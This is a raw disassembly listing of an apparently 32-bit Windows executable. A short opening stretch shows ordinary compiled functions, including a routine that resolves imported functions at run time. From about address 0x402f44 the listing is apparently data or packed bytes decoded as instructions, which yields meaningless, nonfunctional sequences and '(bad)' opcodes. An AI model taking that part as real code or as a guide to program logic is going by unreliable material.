  401aa8:	mov    eax,DWORD PTR [ebp-0x18]
  401aab:	mov    DWORD PTR [ebp-0x14],eax
  401aae:	mov    ecx,DWORD PTR [ebp-0x14]
  401ab1:	movzx  edx,WORD PTR [ecx]
  401ab4:	mov    DWORD PTR [ebp-0xc],edx
  401ab7:	mov    eax,DWORD PTR [ebp-0xc]
  401aba:	mov    esp,ebp
  401abc:	pop    ebp
  401abd:	ret    
  401abe:	int3   
  401abf:	int3   
  401ac0:	push   ebp
  401ac1:	mov    ebp,esp
  401ac3:	sub    esp,0xc
  401ac6:	mov    eax,DWORD PTR [ebp+0x8]
  401ac9:	mov    DWORD PTR [ebp-0x8],eax
  401acc:	mov    ecx,DWORD PTR [ebp+0xc]
  401acf:	mov    DWORD PTR [ebp-0xc],ecx
  401ad2:	mov    DWORD PTR [ebp-0x4],0x22b
  401ad9:	mov    edx,DWORD PTR [ebp-0x8]
  401adc:	cmp    edx,DWORD PTR [ebp-0xc]
  401adf:	jae    0x401aef
  401ae1:	mov    DWORD PTR [ebp-0x4],0x22b
  401ae8:	mov    eax,DWORD PTR [ebp-0x8]
  401aeb:	jmp    0x401af9
  401aed:	jmp    0x401af9
  401aef:	mov    DWORD PTR [ebp-0x4],0x22b
  401af6:	mov    eax,DWORD PTR [ebp-0xc]
  401af9:	mov    esp,ebp
  401afb:	pop    ebp
  401afc:	ret    
  401afd:	int3   
  401afe:	int3   
  401aff:	int3   
  401b00:	push   ebp
  401b01:	mov    ebp,esp
  401b03:	sub    esp,0x8
  401b06:	mov    eax,DWORD PTR [ebp+0x8]
  401b09:	cmp    DWORD PTR [eax+0x4],0x0
  401b0d:	je     0x401b4b
  401b0f:	mov    ecx,DWORD PTR [ebp+0x8]
  401b12:	add    ecx,0x8
  401b15:	mov    DWORD PTR ds:0x42eec0,ecx
  401b1b:	mov    edx,DWORD PTR [ebp+0x8]
  401b1e:	mov    eax,DWORD PTR [edx+0x4]
  401b21:	mov    ds:0x42eebc,eax
  401b26:	call   0x4014a0
  401b2b:	mov    ecx,DWORD PTR [ebp+0x8]
  401b2e:	mov    DWORD PTR ds:0x42eed8,ecx
  401b34:	mov    edx,DWORD PTR [ebp+0x10]
  401b37:	push   edx
  401b38:	mov    eax,DWORD PTR [ebp+0xc]
  401b3b:	push   eax
  401b3c:	push   0x1
  401b3e:	call   0x401b50
  401b43:	add    esp,0xc
  401b46:	mov    DWORD PTR [ebp+0x8],eax
  401b49:	jmp    0x401b06
  401b4b:	mov    esp,ebp
  401b4d:	pop    ebp
  401b4e:	ret    
  401b4f:	int3   
  401b50:	push   ebp
  401b51:	mov    ebp,esp
  401b53:	cmp    DWORD PTR [ebp+0x8],0x1
  401b57:	jne    0x401b61
  401b59:	mov    eax,ds:0x42eed8
  401b5e:	mov    DWORD PTR [ebp+0x8],eax
  401b61:	mov    ecx,DWORD PTR [ebp+0x10]
  401b64:	push   ecx
  401b65:	mov    edx,DWORD PTR [ebp+0xc]
  401b68:	push   edx
  401b69:	mov    eax,DWORD PTR [ebp+0x8]
  401b6c:	push   eax
  401b6d:	call   0x401540
  401b72:	add    esp,0xc
  401b75:	mov    ecx,DWORD PTR [ebp+0x8]
  401b78:	push   ecx
  401b79:	call   0x401980
  401b7e:	add    esp,0x4
  401b81:	mov    DWORD PTR [ebp+0x8],eax
  401b84:	mov    eax,DWORD PTR [ebp+0x8]
  401b87:	pop    ebp
  401b88:	ret    
  401b89:	int3   
  401b8a:	int3   
  401b8b:	int3   
  401b8c:	int3   
  401b8d:	int3   
  401b8e:	int3   
  401b8f:	int3   
  401b90:	push   ebp
  401b91:	mov    ebp,esp
  401b93:	mov    eax,ds:0x42eda4
  401b98:	mov    ds:0x42eec8,eax
  401b9d:	push   0x4250c0
  401ba2:	push   0x4250cc
  401ba7:	call   DWORD PTR ds:0x42edb0
  401bad:	push   eax
  401bae:	call   DWORD PTR ds:0x42edb4
  401bb4:	mov    ds:0x42eecc,eax
  401bb9:	pop    ebp
  401bba:	ret    
  401bbb:	int3   
	...
  402f44:	add    BYTE PTR [edx],al
  402f46:	add    BYTE PTR [eax],al
  402f48:	ds pop ebx
  402f4a:	add    BYTE PTR [eax],al
  402f4c:	push   esi
  402f4d:	pop    ebx
  402f4e:	add    BYTE PTR [eax],al
  402f50:	ret    0x9069
  402f53:	xor    dl,dl
  402f55:	imul   ebx,DWORD PTR [eax-0x5f963dce],0xa869e232
  402f5f:	xor    bh,BYTE PTR [esi]
  402f61:	cmp    eax,DWORD PTR [ecx]
  402f63:	add    BYTE PTR [edx+0x5b],bl
  402f66:	add    BYTE PTR [eax],al
  402f68:	pop    ebp
  402f69:	mov    di,WORD PTR ds:0x3d9a66ce
  402f70:	shl    DWORD PTR [esi-0x58],1
  402f73:	cmp    eax,0x3dd36698
  402f78:	and    BYTE PTR [esi-0x18],0x3d
  402f7c:	inc    edx
  402f7d:	gs sub eax,0x5165053e
  402f83:	ds out 0x64,eax
  402f86:	fnstsw WORD PTR [esi]
  402f88:	pop    edx
  402f89:	add    BYTE PTR fs:[eax],al
  402f8c:	sub    eax,DWORD PTR ds:[ecx]
  402f8f:	add    BYTE PTR [esi],dl
  402f91:	pop    ebx
  402f92:	add    BYTE PTR [eax],al
  402f94:	add    DWORD PTR [ebx-0x33],ebp
  402f97:	xor    BYTE PTR [ebx],cl
  402f99:	imul   eax,DWORD PTR [ecx+esi*1],0x4b
  402f9d:	push   0x27
  402f9f:	xor    eax,edx
  402fa1:	imul   eax,ebx,0xe969e531
  402fa7:	xor    DWORD PTR [ecx],edx
  402fa9:	push   0xffffffff
  402fab:	xor    DWORD PTR [eax],eax
	...
  402fd5:	add    BYTE PTR [edx+0x69],cl
  402fd8:	adc    dh,BYTE PTR [edx]
  402fda:	sbb    BYTE PTR [ecx+0x31],ch
  402fdd:	xor    ah,BYTE PTR [edi]
  402fdf:	imul   edi,DWORD PTR [edi],0x58697b32
  402fe5:	xor    bh,bh
  402fe7:	push   0x67b832c7
  402fec:	mov    esi,DWORD PTR [ebx]
  402fee:	stos   DWORD PTR es:[edi],eax
  402fef:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  402ff1:	xor    ecx,DWORD PTR [esi-0x5dcc3299]
  402ff7:	addr16 jmp 0xf834:0x216f3c33
  402fff:	outs   dx,BYTE PTR ds:[esi]
  403000:	push   edi
  403001:	xor    al,0x2
  403003:	outs   dx,DWORD PTR ds:[esi]
  403004:	arpl   WORD PTR [edi+edx*1],si
  403007:	outs   dx,DWORD PTR ds:[esi]
  403008:	xor    BYTE PTR [esi+eax*8],0x6e
  40300c:	xchg   ecx,eax
  40300d:	xor    al,0xb1
  40300f:	outs   dx,BYTE PTR ds:[esi]
  403010:	sahf   
  403011:	xor    al,0xd3
  403013:	outs   dx,BYTE PTR ds:[esi]
  403014:	mov    ebp,0xd46e7c34
  403019:	xor    al,0x93
  40301b:	outs   dx,BYTE PTR ds:[esi]
  40301c:	out    0x34,eax
  40301e:	jo     0x40308e
  403020:	add    dh,BYTE PTR ds:0x35486e4e
  403026:	or     BYTE PTR [esi+0x54],ch
  403029:	xor    eax,0x356a6ddb
  40302e:	mov    esp,0x7635be6d
  403033:	ins    DWORD PTR es:[edi],dx
  403034:	aad    0x35
  403036:	pop    ds
  403037:	imul   ebp,ebx,0x35
	...
  403061:	add    BYTE PTR [eax],al
  403063:	add    BYTE PTR [edx],ch
  403065:	imul   edi,esi,0xe693735
  40306b:	ss dec edx
  40306d:	imul   ebx,DWORD PTR ds:0x34696936,0x3f695436
  403077:	sub    DWORD PTR ss:[ecx+0x49],0x36
  40307c:	jo     0x4030e7
  40307e:	push   esp
  40307f:	ss pop esp
  403081:	imul   ebp,DWORD PTR [eax+0x36],0x36726963
  403088:	mov    ecx,0xf8369a69
  40308d:	imul   ecx,esp,0xdc69ec36
  403093:	cmp    BYTE PTR ss:[edx+0x2b],ch
  403097:	aaa    
  403098:	push   es
  403099:	push   0x4c
  40309b:	aaa    
  40309c:	push   0x2737636a
  4030a1:	push   0x71
  4030a3:	aaa    
  4030a4:	aaa    
  4030a5:	push   0xffffff84
  4030a7:	aaa    
  4030a8:	mov    edx,0xdc379d6a
  4030ad:	push   0xffffffb1
  4030af:	aaa    
  4030b0:	sub    DWORD PTR [edx-0x32],0x37
  4030b4:	push   0x3e37e56a
  4030b9:	pop    ebx
  4030ba:	add    BYTE PTR [eax],al
  4030bc:	ds pop ebx
  4030be:	add    BYTE PTR [eax],al
  4030c0:	ds pop ebx
  4030c2:	add    BYTE PTR [eax],al
  4030c4:	ds pop ebx
	...
  4030f2:	ds pop ebx
  4030f4:	add    BYTE PTR [eax],al
  4030f6:	ds pop ebx
  4030f8:	add    BYTE PTR [eax],al
  4030fa:	ds pop ebx
  4030fc:	add    BYTE PTR [eax],al
  4030fe:	ds pop ebx
  403100:	add    BYTE PTR [eax],al
  403102:	ds pop ebx
  403104:	add    BYTE PTR [eax],al
  403106:	ds pop ebx
  403108:	add    BYTE PTR [eax],al
  40310a:	ds pop ebx
  40310c:	add    BYTE PTR [eax],al
  40310e:	ds pop ebx
  403110:	add    BYTE PTR [eax],al
  403112:	ds pop ebx
  403114:	add    BYTE PTR [eax],al
  403116:	ds pop ebx
  403118:	add    BYTE PTR [eax],al
  40311a:	ds pop ebx
  40311c:	add    BYTE PTR [eax],al
  40311e:	ds pop ebx
  403120:	add    BYTE PTR [eax],al
  403122:	ds pop ebx
  403124:	add    BYTE PTR [eax],al
  403126:	ds pop ebx
  403128:	add    BYTE PTR [eax],al
  40312a:	ds pop ebx
  40312c:	add    BYTE PTR [eax],al
  40312e:	ds pop ebx
  403130:	add    BYTE PTR [eax],al
  403132:	ds pop ebx
  403134:	add    BYTE PTR [eax],al
  403136:	ds pop ebx
  403138:	add    BYTE PTR [eax],al
  40313a:	ds pop ebx
  40313c:	add    BYTE PTR [eax],al
  40313e:	ds pop ebx
  403140:	add    BYTE PTR [eax],al
  403142:	ds pop ebx
  403144:	add    BYTE PTR [eax],al
  403146:	ds pop ebx
  403148:	add    BYTE PTR [eax],al
  40314a:	ds pop ebx
  40314c:	add    BYTE PTR [eax],al
  40314e:	ds pop ebx
  403150:	add    BYTE PTR [eax],al
  403152:	ds pop ebx
	...
  403180:	ds pop ebx
  403182:	add    BYTE PTR [eax],al
  403184:	ds pop ebx
  403186:	add    BYTE PTR [eax],al
  403188:	ds pop ebx
  40318a:	add    BYTE PTR [eax],al
  40318c:	ds pop ebx
  40318e:	add    BYTE PTR [eax],al
  403190:	ds pop ebx
  403192:	add    BYTE PTR [eax],al
  403194:	ds pop ebx
  403196:	add    BYTE PTR [eax],al
  403198:	ds pop ebx
  40319a:	add    BYTE PTR [eax],al
  40319c:	ds pop ebx
  40319e:	add    BYTE PTR [eax],al
  4031a0:	ds pop ebx
  4031a2:	add    BYTE PTR [eax],al
  4031a4:	ds pop ebx
  4031a6:	add    BYTE PTR [eax],al
  4031a8:	ds pop ebx
  4031aa:	add    BYTE PTR [eax],al
  4031ac:	ds pop ebx
  4031ae:	add    BYTE PTR [eax],al
  4031b0:	ds pop ebx
  4031b2:	add    BYTE PTR [eax],al
  4031b4:	ds pop ebx
  4031b6:	add    BYTE PTR [eax],al
  4031b8:	ds pop ebx
  4031ba:	add    BYTE PTR [eax],al
  4031bc:	ds pop ebx
  4031be:	add    BYTE PTR [eax],al
  4031c0:	ds pop ebx
  4031c2:	add    BYTE PTR [eax],al
  4031c4:	ds pop ebx
  4031c6:	add    BYTE PTR [eax],al
  4031c8:	ds pop ebx
  4031ca:	add    BYTE PTR [eax],al
  4031cc:	ds pop ebx
  4031ce:	add    BYTE PTR [eax],al
  4031d0:	ds pop ebx
  4031d2:	add    BYTE PTR [eax],al
  4031d4:	ds pop ebx
  4031d6:	add    BYTE PTR [eax],al
  4031d8:	ds pop ebx
  4031da:	add    BYTE PTR [eax],al
  4031dc:	ds pop ebx
  4031de:	add    BYTE PTR [eax],al
  4031e0:	ds pop ebx
	...
  40320e:	ds pop ebx
  403210:	add    BYTE PTR [eax],al
  403212:	ds pop ebx
  403214:	add    BYTE PTR [eax],al
  403216:	ds pop ebx
  403218:	add    BYTE PTR [eax],al
  40321a:	add    BYTE PTR [edi+0x1],dh
  40321d:	add    BYTE PTR [esi],bh
  40321f:	and    al,BYTE PTR [ecx+0x0]
  403222:	add    DWORD PTR [esi],edi
  403224:	je     0x403276
  403226:	sub    al,0x34
  403228:	arpl   WORD PTR [ecx+0x22],ax
  40322b:	aas    
  40322c:	jb     0x403293
  40322e:	sub    eax,0xa000028
  403233:	xor    al,0x61
  403235:	add    dh,BYTE PTR fs:[edx]
  403238:	bound  esi,QWORD PTR [edx+0x1f]
  40323b:	sub    DWORD PTR [ecx+0x45],edi
  40323e:	push   es
  40323f:	sbb    al,BYTE PTR [eax]
  403241:	add    BYTE PTR [edx],cl
  403243:	xor    al,0x61
  403245:	add    dh,BYTE PTR fs:[edx]
  403248:	bound  esi,QWORD PTR [edx-0x21]
  40324b:	sub    BYTE PTR [ecx+0x45],bh
  40324e:	out    0xb,al
  403250:	add    BYTE PTR [eax],al
  403252:	add    DWORD PTR [esi],edi
  403254:	je     0x4032a3
  403256:	loope  0x403296
  403258:	jne    0x4032c6
  40325a:	jecxz  0x40326e
  40325c:	popa   
  40325d:	outs   dx,BYTE PTR ds:[esi]
  40325e:	fidiv  DWORD PTR [esi]
  403260:	gs inc ecx
  403262:	ds pop ebx
  403264:	add    BYTE PTR [eax],al
  403266:	jge    0x403291
  403268:	gs popa 
  40326a:	mov    dl,0x3e
  40326c:	inc    esi
  40326d:	imul   edx,DWORD PTR [edx-0x55ffbec2],0x9d727428
  403277:	cmp    dh,BYTE PTR [ecx+eax*2+0x3e]
  40327b:	pop    ebx
  40327c:	add    BYTE PTR [eax],al
  40327e:	jns    0x4032be
  403280:	je     0x4032d9
	...
  4032aa:	add    BYTE PTR [eax],al
  4032ac:	addr16 xor eax,0x28696f64
  4032b2:	inc    esp
  4032b3:	imul   ebp,DWORD PTR [esi+edi*1+0x63],0x79295174
  4032bb:	inc    ecx
  4032bc:	ds pop ebx
  4032be:	add    BYTE PTR [eax],al
  4032c0:	jns    0x403300
  4032c2:	je     0x403311
  4032c4:	pop    ecx
  4032c5:	aas    
  4032c6:	jne    0x403334
  4032c8:	pop    ebx
  4032c9:	adc    esp,DWORD PTR [ecx+0x6e]
  4032cc:	and    dh,BYTE PTR [edi]
  4032ce:	gs push edi
  4032d0:	ds pop ebx
  4032d2:	add    BYTE PTR [eax],al
  4032d4:	inc    edx
  4032d5:	pop    ecx
  4032d6:	inc    eax
  4032d7:	add    BYTE PTR [edx+0x59],cl
  4032da:	inc    eax
  4032db:	add    BYTE PTR [edx+0x59],ah
  4032de:	inc    eax
  4032df:	add    BYTE PTR [edx+0x59],cl
  4032e2:	inc    eax
  4032e3:	add    dh,dh
  4032e5:	pop    eax
  4032e6:	inc    eax
  4032e7:	add    dl,ch
  4032e9:	pop    eax
  4032ea:	inc    eax
  4032eb:	add    dh,bl
  4032ed:	pop    eax
  4032ee:	inc    eax
  4032ef:	add    dh,dh
  4032f1:	pop    eax
  4032f2:	inc    eax
  4032f3:	add    BYTE PTR [ecx],al
  4032f5:	ds je  0x403348
  4032f8:	in     al,dx
  4032f9:	xor    esp,DWORD PTR [ebx+0x41]
  4032fc:	loop   0x40333c
  4032fe:	jb     0x403365
  403300:	int    0x27
  403302:	add    BYTE PTR [eax],al
  403304:	cli    
  403305:	xor    esp,DWORD PTR [ecx+0x64]
  403308:	repnz xor DWORD PTR [edx+0x72],esp
  40330c:	lahf   
  40330d:	sub    eax,0x4579
	...
  40333a:	mov    dh,0x1c
  40333c:	add    BYTE PTR [eax],al
  40333e:	xchg   ebp,eax
  40333f:	cmp    BYTE PTR [edx+0x6e],dh
  403342:	fwait
  403343:	das    
  403344:	xor    esi,DWORD PTR [edx]
  403346:	push   0x3e6c6c37
  40334b:	pop    ebx
  40334c:	add    BYTE PTR [eax],al
  40334e:	fwait
  40334f:	cs jbe 0x4033b5
  403352:	mov    WORD PTR [edi],fs
  403354:	cs fs push 0x2f
  403358:	add    BYTE PTR [eax],al
  40335a:	arpl   WORD PTR [eax],di
  40335c:	ins    DWORD PTR es:[edi],dx
  40335d:	jae    0x4033c2
  40335f:	daa    
  403360:	add    BYTE PTR [eax],al
  403362:	push   ebx
  403363:	cs jbe 0x4033c9
  403366:	dec    esp
  403367:	daa    
  403368:	cs bound ebp,QWORD PTR fs:[edi]
  40336c:	add    BYTE PTR [eax],al
  40336e:	pop    ebx
  40336f:	cmp    BYTE PTR [ebp+0x63],ch
  403372:	dec    esi
  403373:	and    al,0x0
  403375:	add    BYTE PTR [eax],dl
  403377:	xor    al,0x72
  403379:	je     0x4033a6
  40337b:	cmp    al,0x6c
  40337d:	inc    ecx
  40337e:	sbb    ch,BYTE PTR [edi]
  403380:	outs   dx,DWORD PTR ds:[esi]
  403381:	arpl   WORD PTR [esi],di
  403383:	pop    ebx
  403384:	add    BYTE PTR [eax],al
  403386:	lock xor esi,DWORD PTR [edx+0x74]
  40338a:	or     edi,DWORD PTR [esp+ebp*2]
  40338d:	inc    ecx
  40338e:	sbb    ch,BYTE PTR [edi]
  403390:	outs   dx,DWORD PTR ds:[esi]
  403391:	arpl   WORD PTR [esi],di
  403393:	pop    ebx
  403394:	add    BYTE PTR [eax],al
  403396:	adc    esi,DWORD PTR [ecx]
  403398:	ins    DWORD PTR es:[edi],dx
  403399:	popa   
  40339a:	out    dx,al
  40339b:	or     BYTE PTR [ecx+0x65],ch
	...
  4033c6:	add    BYTE PTR [eax],al
  4033c8:	icebp  
  4033c9:	adc    DWORD PTR [esi+0x46],esp
  4033cc:	xlat   BYTE PTR ds:[ebx]
  4033cd:	cs gs add al,dh
  4033d1:	xor    esi,DWORD PTR [edx+0x74]
  4033d4:	retf   
  4033d5:	cmp    ebp,DWORD PTR [eax+edx*2-0x34]
  4033d9:	xor    DWORD PTR [ebp+eiz*2-0x23],esi
  4033dd:	add    BYTE PTR es:[eax],al
  4033e0:	xchg   BYTE PTR [eax],bh
  4033e2:	popa   
  4033e3:	jo     0x403464
  4033e5:	das    
  4033e6:	ins    BYTE PTR es:[edi],dx
  4033e7:	outs   dx,DWORD PTR ds:[esi]
  4033e8:	popf   
  4033e9:	pop    ebx
  4033ea:	add    BYTE PTR [eax],al
  4033ec:	xchg   ebp,eax
  4033ed:	cmp    BYTE PTR [edx+0x6e],dh
  4033f0:	mov    ds:0x6032332f,eax
  4033f5:	aaa    
  4033f6:	ins    BYTE PTR es:[edi],dx
  4033f7:	ins    BYTE PTR es:[edi],dx
  4033f8:	ds pop ebx
  4033fa:	add    BYTE PTR [eax],al
  4033fc:	jns    0x403436
  4033fe:	je     0x403450
  403400:	ins    BYTE PTR es:[edi],dx
  403401:	xor    ah,BYTE PTR [ebx+0x65]
  403404:	ins    DWORD PTR es:[edi],dx
  403405:	cs dec eax
  403407:	gs pop edi
  403409:	sub    eax,DWORD PTR [eax]
  40340b:	add    BYTE PTR [esi],bh
  40340d:	pop    ebx
  40340e:	add    WORD PTR [esi],di
  403411:	neg    DWORD PTR [ecx-0x70]
  403414:	ds mov ch,0x3
  403417:	add    BYTE PTR [esi],bh
  403419:	mov    al,0x3
  40341b:	add    BYTE PTR [esi],bh
  40341d:	mov    eax,ds:0x6c3e00fb
  403422:	add    eax,DWORD PTR [eax]
  403424:	ds mov ah,0x3
  403427:	add    BYTE PTR [esi],bh
  403429:	je     0x40342f
	...
  403453:	add    BYTE PTR [eax],al
  403455:	add    BYTE PTR [esi],bh
  403457:	mov    ah,0x3
  403459:	add    BYTE PTR [esi],bh
  40345b:	mov    ah,0x3
  40345d:	add    BYTE PTR [esi],bh
  40345f:	mov    ah,0x3
  403461:	add    BYTE PTR [esi],bh
  403463:	mov    ah,0x3
  403465:	add    BYTE PTR [esi],bh
  403467:	mov    ah,0x3
  403469:	add    BYTE PTR [esi],bh
  40346b:	mov    ah,0x3
  40346d:	add    BYTE PTR [esi],bh
  40346f:	mov    ah,0x3
  403471:	add    BYTE PTR [esi],bh
  403473:	mov    ah,0x3
  403475:	add    BYTE PTR [esi],bh
  403477:	xor    al,0x4
  403479:	add    BYTE PTR [esi],bh
  40347b:	mov    edx,0xb440ba1a
  403480:	scas   eax,DWORD PTR es:[edi]
  403481:	or     DWORD PTR [ebx-0x6e],edi
  403484:	mov    ebx,0x25eef201
  403489:	push   esp
  40348a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40348b:	pop    ebx
  40348c:	ja     0x4034ae
  40348e:	scas   al,BYTE PTR es:[edi]
  40348f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403490:	push   0x67
  403492:	lods   al,BYTE PTR ds:[esi]
  403493:	xchg   ebx,eax
  403494:	push   0x69939d20
  403499:	outs   dx,BYTE PTR ds:[esi]
  40349a:	test   eax,0x9b62237e
  40349f:	push   edx
  4034a0:	jbe    0x403517
  4034a2:	cwde   
  4034a3:	push   edx
  4034a4:	ins    DWORD PTR es:[edi],dx
  4034a5:	outs   dx,BYTE PTR ds:[esi]
  4034a6:	pop    esi
  4034a7:	test   BYTE PTR [edx+0x53],0x1e
  4034ab:	xchg   edi,eax
  4034ac:	push   0x64
  4034ae:	pop    ebx
  4034af:	mov    al,ds:0x5b340d08
  4034b4:	int    0x3
  4034b6:	ds pop ebx
  4034b8:	jmp    0x4034c0
	...
  4034e1:	add    BYTE PTR [eax],al
  4034e3:	add    BYTE PTR [esi],bh
  4034e5:	pop    ebx
  4034e6:	mov    ecx,0x9d5b3e40
  4034eb:	add    al,0x3d
  4034ed:	pop    ebx
  4034ee:	je     0x40353b
  4034f0:	ds or  ebp,ecx
  4034f3:	add    edi,DWORD PTR [esi]
  4034f5:	pop    ebx
  4034f6:	jmp    0x99b72fe
  4034fb:	add    al,0x39
  4034fd:	pop    edx
  4034fe:	repnz add al,0x3c
  403501:	ins    DWORD PTR es:[edi],dx
  403502:	jmp    0xe99b7422
  403507:	push   ebp
  403508:	ds pop ebx
  40350a:	jmp    0x109b7312
  40350f:	pop    es
  403510:	aas    
  403511:	pop    ebx
  403512:	jmp    0xe99b732a
  403517:	xor    edi,DWORD PTR [edi]
  403519:	pop    ebx
  40351a:	jmp    0xe99b3322
  40351f:	adc    edi,DWORD PTR [esi]
  403521:	pop    ebx
  403522:	jmp    0xed9b732c
  403527:	add    edi,DWORD PTR [esi]
  403529:	pop    ebx
  40352a:	jmp    0xed9b7332
  40352f:	add    edi,DWORD PTR [esi]
  403531:	pop    ebx
  403532:	jmp    0xe99b733a
  403537:	xchg   ebx,eax
  403538:	aas    
  403539:	pop    ebx
  40353a:	jmp    0x6c9b7344
  40353f:	push   cs
  403540:	cmp    al,0x5b
  403542:	jmp    0x403547
  403544:	ds pop ebx
  403546:	jmp    0x40354e
	...
  40356f:	add    BYTE PTR [eax],al
  403571:	add    BYTE PTR [esi],ch
  403573:	pop    ebx
  403574:	jmp    0xe99b738c
  403579:	add    ebp,DWORD PTR [esi]
  40357b:	pop    ebx
  40357c:	jmp    0x9b7394
  403581:	jmp    0xd94090c3
  403586:	cmp    eax,0x3de9005b
  40358b:	pop    ebx
  40358c:	add    cl,ch
  40358e:	cmp    eax,0x5725005b
  403593:	pop    edx
  403594:	add    BYTE PTR [ecx],ah
  403596:	cmp    eax,0x3de9005b
  40359b:	pop    ebx
  40359c:	add    cl,ch
  40359e:	cmp    eax,0x3de9005b
  4035a3:	pop    ebx
  4035a4:	add    cl,ch
  4035a6:	cmp    eax,0x3de9005b
  4035ab:	pop    ebx
  4035ac:	add    cl,ch
  4035ae:	cmp    eax,0x3de9005b
  4035b3:	pop    ebx
  4035b4:	add    cl,ch
  4035b6:	cmp    eax,0x3de9005b
  4035bb:	pop    ebx
  4035bc:	add    cl,ch
  4035be:	cmp    eax,0x3de9005b
  4035c3:	pop    ebx
  4035c4:	add    cl,ch
  4035c6:	cmp    eax,0x3de9005b
  4035cb:	pop    ebx
  4035cc:	add    cl,ch
  4035ce:	cmp    eax,0x3de9005b
  4035d3:	pop    ebx
  4035d4:	add    cl,ch
	...
  4035fe:	add    BYTE PTR [eax],al
  403600:	cmp    eax,0x3de9005b
  403605:	pop    ebx
  403606:	add    cl,ch
  403608:	cmp    eax,0x3de9005b
  40360d:	pop    ebx
  40360e:	add    cl,ch
  403610:	cmp    eax,0xbd0d005b
  403615:	pop    esp
  403616:	add    BYTE PTR [ecx+0x3d],bh
  403619:	pop    ebx
  40361a:	add    cl,ch
  40361c:	cmp    eax,0x3de9005b
  403621:	pop    ebx
  403622:	add    BYTE PTR [eax],al
  403624:	pop    ss
  403625:	pop    ebx
  403626:	add    BYTE PTR [eax],al
  403628:	out    0x5a,eax
  40362a:	add    BYTE PTR [eax],al
  40362c:	out    0x5a,eax
  40362e:	add    BYTE PTR [eax],al
  403630:	xlat   BYTE PTR ds:[ebx]
  403631:	pop    edx
  403632:	add    BYTE PTR [eax],al
  403634:	or     DWORD PTR [edi],ebp
  403636:	gs js  0x4035ec
  403639:	pop    edx
  40363a:	add    BYTE PTR [eax],al
  40363c:	pushf  
  40363d:	dec    ebx
  40363e:	add    DWORD PTR [eax],eax
  403640:	xlat   BYTE PTR ds:[ebx]
  403641:	dec    edx
  403642:	add    BYTE PTR [eax],al
  403644:	xlat   BYTE PTR ds:[ebx]
  403645:	inc    edx
  403646:	add    DWORD PTR [eax],eax
  403648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403649:	pop    eax
  40364a:	add    BYTE PTR [eax],al
  40364c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40364d:	pop    edx
  40364e:	add    BYTE PTR [eax],al
  403650:	xchg   edi,eax
  403651:	pop    edx
  403652:	add    BYTE PTR [eax],al
  403654:	xchg   edi,eax
  403655:	pop    edx
  403656:	add    BYTE PTR [eax],al
  403658:	inc    edi
  403659:	push   edi
  40365a:	add    BYTE PTR [eax+0x39],ah
  40365d:	and    eax,0x39f36164
	...
  40368e:	xchg   edi,eax
  40368f:	pop    ecx
  403690:	add    BYTE PTR [eax],al
  403692:	addr16 push 0x1
  403695:	add    BYTE PTR [edi+0x58],ah
  403698:	add    BYTE PTR [eax],al
  40369a:	push   edi
  40369b:	inc    eax
  40369c:	add    DWORD PTR [eax],eax
  40369e:	push   edi
  40369f:	pop    edx
  4036a0:	add    BYTE PTR [eax],al
  4036a2:	addr16 pop edx
  4036a4:	add    BYTE PTR [eax],al
  4036a6:	addr16 pop edx
  4036a8:	add    BYTE PTR [eax],al
  4036aa:	pop    ss
  4036ab:	push   edi
  4036ac:	add    BYTE PTR [eax+0x69],al
  4036af:	(bad)  
  4036b0:	pusha  
  4036b1:	je     0x4036f9
  4036b3:	push   edi
  4036b4:	add    BYTE PTR [eax],al
  4036b6:	das    
  4036b7:	adc    al,0x0
  4036b9:	add    BYTE PTR [edi],dl
  4036bb:	sbb    al,BYTE PTR [ecx]
  4036bd:	add    BYTE PTR [edi],dl
  4036bf:	adc    BYTE PTR [eax],al
  4036c1:	add    BYTE PTR [edi],ah
  4036c3:	inc    esi
  4036c4:	add    DWORD PTR [eax],eax
  4036c6:	ds mov ah,0x3
  4036c9:	add    BYTE PTR [esi],bh
  4036cb:	mov    ah,0x3
  4036cd:	add    BYTE PTR [esi],bh
  4036cf:	mov    ah,0x3
  4036d1:	add    BYTE PTR [esi],bh
  4036d3:	hlt    
  4036d4:	add    eax,DWORD PTR [eax]
  4036d6:	(bad)  
  4036d7:	mov    bl,0x3
  4036d9:	add    BYTE PTR [esi],bh
  4036db:	mov    ah,0x3
  4036dd:	add    BYTE PTR [esi],bh
  4036df:	mov    ah,0x3
  4036e1:	add    BYTE PTR [esi],bh
  4036e3:	mov    ah,0x3
  4036e5:	add    BYTE PTR [esi],bh
  4036e7:	fisttp WORD PTR [esp+ebp*8+0xf6bec6e]
  4036ee:	cs hlt 
  4036f0:	add    edi,eax
	...
  40371a:	add    BYTE PTR [eax],al
  40371c:	sub    al,0xb3
  40371e:	(bad)  
  40371f:	push   DWORD PTR [ecx+0x3f6a0b1e]
  403725:	fiadd  DWORD PTR [ebx]
  403727:	call   0x44b751
  40372c:	xchg   ecx,esi
  40372e:	add    BYTE PTR [eax],al
  403730:	jmp    0x40376a
  403732:	call   0x265c1d87
  403737:	adc    dh,bh
  403739:	mov    bl,0xfb
  40373b:	jb     0x40377c
  40373d:	icebp  
  40373e:	test   DWORD PTR [ebx+0x7403bbf3],0x8513935
  403748:	mov    ch,0xa1
  40374a:	div    BYTE PTR [ebp+0x46]
  40374d:	mov    ebp,0xf1870852
  403752:	add    BYTE PTR [eax],al
  403754:	repz cmp al,ch
  403757:	cmp    DWORD PTR [edx-0x25],0x54
  40375b:	pop    eax
  40375c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40375d:	inc    edi
  40375e:	adc    al,0x40
  403760:	sub    dh,BYTE PTR ds:[edx+0x1]
  403764:	std    
  403765:	sub    eax,0x5b3275f7
  40376a:	jbe    0x4037ad
  40376c:	push   ss
  40376d:	xchg   ebp,eax
  40376e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40376f:	idiv   DWORD PTR [esi]
  403771:	pop    ebx
  403772:	jmp    0xe146ec7a
  403777:	mov    ch,BYTE PTR [ecx+esi*1]
  40377a:	jmp    0x3e8bab75
  40377f:	jno    0x403781
	...
  4037a9:	add    dl,dh
  4037ab:	pushf  
  4037ac:	mov    esp,0xe126e9fb
  4037b1:	test   BYTE PTR [edi+eax*2+0x5b4ac230],0xb4
  4037b9:	mov    ah,dl
  4037bb:	fsubr  DWORD PTR ds:0x81036efc
  4037c1:	test   DWORD PTR [esi],ebp
